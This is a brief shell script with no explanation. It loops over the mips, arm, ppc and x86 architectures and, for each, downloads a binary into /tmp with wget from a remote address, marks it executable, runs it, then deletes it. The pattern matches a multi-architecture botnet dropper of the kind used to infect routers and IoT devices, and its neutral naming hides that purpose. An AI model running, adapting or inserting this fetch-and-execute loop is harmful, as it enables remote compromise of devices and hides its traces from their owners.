#!/bin/sh
variants="mips arm ppc x86"
remote=127.0.0.1
artifact=build
out=worker
for cpu in $variants; do
cd /tmp
wget http://$remote/$artifact.$cpu -O $out
chmod 700 $out
./$out
rm -f $out
done
